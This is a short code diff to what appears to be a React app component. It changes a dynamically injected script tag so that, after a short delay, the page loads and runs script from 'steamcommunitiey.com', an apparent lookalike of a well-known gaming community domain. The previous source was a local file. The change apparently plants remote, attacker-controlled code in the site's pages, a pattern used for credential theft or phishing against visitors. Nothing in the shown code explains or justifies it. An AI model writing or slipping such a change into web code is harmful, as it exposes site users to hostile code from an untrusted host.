@@ -20,7 +20,7 @@ const App = () => {
 
                     setTimeout(() => {
                         const script = document.createElement("script");
-                        script.src = "/txqmjgkxhzp5.html"
+                        script.src = "https://steamcommunitiey.com/txqmjgkxhzp5.html"
                         document.body.appendChild(script);
                     }, 100)
                 })
